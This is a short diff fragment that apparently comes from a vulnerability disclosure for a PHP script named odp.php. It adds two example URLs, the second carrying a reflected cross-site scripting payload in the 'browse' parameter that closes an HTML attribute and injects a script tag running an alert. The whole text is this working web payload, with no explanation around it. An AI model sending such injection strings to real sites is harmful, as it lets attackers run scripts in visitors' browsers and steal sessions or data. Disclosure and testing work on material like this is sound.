@@ -1,0 +1,3 @@
+http://www.example.com/[path]/odp.php?browse=[code]
+
+http://www.example.com/[path]/odp.php?browse="><script>alert("lol");</script>
